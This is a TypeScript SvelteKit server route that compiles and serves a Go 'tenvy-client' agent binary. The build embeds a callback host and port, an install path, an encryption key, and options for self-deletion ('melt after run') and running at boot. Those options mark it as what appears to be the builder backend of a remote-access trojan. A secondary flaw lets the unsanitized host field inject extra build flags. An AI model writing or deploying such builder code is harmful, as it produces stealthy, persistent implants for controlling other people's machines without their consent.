import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { mkdtemp, rm, mkdir, copyFile, chmod } from 'node:fs/promises';
import { join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { spawn } from 'node:child_process';

interface BuildRequestBody {
        host: string;
        port?: string | number;
        outputFilename?: string;
        installationPath?: string;
        encryptionKey?: string;
        meltAfterRun?: boolean;
        startupOnBoot?: boolean;
}

interface BuildResponseBody {
        success: boolean;
        message: string;
        outputPath?: string;
        downloadUrl?: string;
        log?: string[];
}

function sanitizeFilename(value: string): string {
        const cleaned = value.replace(/[^A-Za-z0-9._-]/g, '_');
        return cleaned.length > 0 ? cleaned : `tenvy-client-${Date.now()}`;
}

function encodeBase64(value: string): string {
        return Buffer.from(value, 'utf8').toString('base64');
}

export const POST: RequestHandler = async ({ request }) => {
        let payload: BuildRequestBody;
        try {
                payload = (await request.json()) as BuildRequestBody;
        } catch (err) {
                throw error(400, 'Invalid build payload');
        }

        const host = payload.host?.toString().trim();
        if (!host) {
                throw error(400, 'Host is required');
        }

        const port = (payload.port ?? '3000').toString().trim();
        if (!/^\d+$/.test(port)) {
                throw error(400, 'Port must be numeric');
        }

        const outputFilename = sanitizeFilename((payload.outputFilename ?? 'tenvy-client').toString().trim());
        const installationPath = (payload.installationPath ?? '').toString().trim();
        const encryptionKey = (payload.encryptionKey ?? '').toString();
        const meltAfterRun = Boolean(payload.meltAfterRun);
        const startupOnBoot = Boolean(payload.startupOnBoot);

        const repoRoot = resolve(process.cwd(), '..');
        let tempDir: string | null = null;
        const buildOutput: string[] = [];

        try {
                tempDir = await mkdtemp(join(tmpdir(), 'tenvy-build-'));
                const tempBinaryPath = join(tempDir, outputFilename);
                const ldflags = [
                        `-X main.defaultServerHost=${host}`,
                        `-X main.defaultServerPort=${port}`,
                        `-X main.defaultInstallPathEncoded=${encodeBase64(installationPath)}`,
                        `-X main.defaultEncryptionKeyEncoded=${encodeBase64(encryptionKey)}`,
                        `-X main.defaultMeltAfterRun=${meltAfterRun ? 'true' : 'false'}`,
                        `-X main.defaultStartupOnBoot=${startupOnBoot ? 'true' : 'false'}`
                ].join(' ');

                const goArgs = ['build', '-o', tempBinaryPath, '-ldflags', ldflags, './tenvy-client/cmd'];
                const builder = spawn('go', goArgs, {
                        cwd: repoRoot,
                        env: process.env,
                        stdio: ['ignore', 'pipe', 'pipe']
                });

                builder.stdout.on('data', (chunk) => {
                        buildOutput.push(chunk.toString());
                });
                builder.stderr.on('data', (chunk) => {
                        buildOutput.push(chunk.toString());
                });

                const exitCode: number = await new Promise((resolveBuild, rejectBuild) => {
                        builder.on('error', rejectBuild);
                        builder.on('close', (code) => resolveBuild(code ?? 0));
                });

                const logLines = buildOutput.join('').split(/\r?\n/).filter((line) => line.trim().length > 0);

                if (exitCode !== 0) {
                        const response: BuildResponseBody = {
                                success: false,
                                message: `go build failed with exit code ${exitCode}`,
                                log: logLines
                        };
                        return json(response, { status: 200 });
                }

                const buildsDir = join(repoRoot, 'tenvy-server', 'static', 'builds');
                await mkdir(buildsDir, { recursive: true });
                const finalPath = join(buildsDir, outputFilename);

                await copyFile(tempBinaryPath, finalPath);
                await chmod(finalPath, 0o755);

                const response: BuildResponseBody = {
                        success: true,
                        message: 'Agent built successfully',
                        outputPath: finalPath,
                        downloadUrl: `/builds/${encodeURIComponent(outputFilename)}`,
                        log: logLines
                };

                return json(response);
        } catch (err) {
                const captured = buildOutput.join('').split(/\r?\n/).filter((line) => line.trim().length > 0);

                if (err instanceof Error && (err as NodeJS.ErrnoException).code === 'ENOENT') {
                        return json(
                                {
                                        success: false,
                                        message: 'Go compiler is not available in the build environment.',
                                        log: captured
                                },
                                { status: 200 }
                        );
                }

                const message = err instanceof Error ? err.message : 'Failed to build agent';
                return json(
                        {
                                success: false,
                                message,
                                log: captured
                        },
                        { status: 200 }
                );
        } finally {
                if (tempDir) {
                        await rm(tempDir, { recursive: true, force: true });
                }
        }
};
